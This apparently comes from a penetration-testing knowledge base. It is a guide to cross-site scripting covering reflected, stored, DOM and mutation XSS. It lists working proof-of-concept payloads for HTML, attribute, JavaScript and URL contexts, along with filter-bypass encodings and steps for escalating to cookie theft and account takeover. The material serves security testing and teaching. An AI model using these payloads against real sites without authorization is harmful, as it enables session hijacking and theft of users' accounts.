---
id: "xss-techniques"
title: "Cross-Site Scripting (XSS) - Complete Guide"
type: "technique"
category: "web-application"
subcategory: "xss"
tags: ["xss", "reflected", "stored", "dom", "javascript", "owasp"]
difficulty: "intermediate"
platforms: ["linux", "macos", "windows"]
related: ["xss-basic-payloads", "xss-bypass-payloads"]
updated: "2026-03-30"
---

## Overview

Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users. It remains one of the most common and impactful web vulnerabilities. XSS can lead to session hijacking, credential theft, defacement, and malware distribution.

## Types of XSS

### Reflected XSS
User input is immediately reflected in the response without proper sanitization. The payload is delivered via a crafted URL or form submission.

```
https://target.com/search?q=<script>alert(document.cookie)</script>
```

### Stored XSS
The malicious payload is permanently stored on the target server (database, message forum, comment field). Every user who views the affected page executes the payload.

### DOM-Based XSS
The vulnerability exists in client-side JavaScript code that processes user input and writes it to the DOM without sanitization. The server never sees the payload.

```javascript
// Vulnerable code
document.getElementById('output').innerHTML = location.hash.substring(1);
```

### Mutation XSS (mXSS)
Exploits browser HTML parsing quirks where sanitized HTML gets mutated during DOM insertion, creating executable JavaScript.

## Testing Methodology

1. **Identify injection points** — search forms, URL parameters, headers (User-Agent, Referer), JSON fields, file upload names
2. **Determine context** — HTML body, attribute, JavaScript, URL, CSS
3. **Test basic payloads** — `<script>alert(1)</script>`, `"><img src=x onerror=alert(1)>`
4. **Identify filters** — what gets blocked or sanitized?
5. **Craft bypass payloads** — encoding, case variation, tag/event alternatives
6. **Escalate impact** — cookie theft, account takeover, keylogging

## Context-Specific Payloads

### HTML Context
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
```

### Attribute Context
```html
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
' onfocus='alert(1)' autofocus='
```

### JavaScript Context
```javascript
';alert(1)//
\';alert(1)//
</script><script>alert(1)</script>
```

### URL Context
```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

## Filter Bypass Techniques

- **Case variation**: `<ScRiPt>alert(1)</ScRiPt>`
- **HTML encoding**: `&#x3C;script&#x3E;`
- **URL encoding**: `%3Cscript%3E`
- **Double encoding**: `%253Cscript%253E`
- **Null bytes**: `<scr%00ipt>alert(1)</script>`
- **Event handlers**: `<img src=x onerror=alert(1)>` when `<script>` is blocked
- **SVG/MathML**: `<svg><script>alert(1)</script></svg>`
- **Template literals**: `` ${alert(1)} ``

## Impact and Severity

- **Session hijacking**: Steal cookies and impersonate users
- **Account takeover**: Change email/password via XSS
- **Credential harvesting**: Inject fake login forms
- **Keylogging**: Capture keystrokes on the page
- **Cryptocurrency mining**: Inject miners
- **Worm propagation**: Self-replicating stored XSS

## Tools

- **Burp Suite** — intercept and modify requests, scan for XSS
- **XSStrike** — advanced XSS detection with fuzzing and WAF bypass
- **Dalfox** — parameter analysis and XSS scanning
- **kxss** — reflect parameter finder for XSS testing
- **BountyBud XSS Payload Generator** — context-aware payload generation
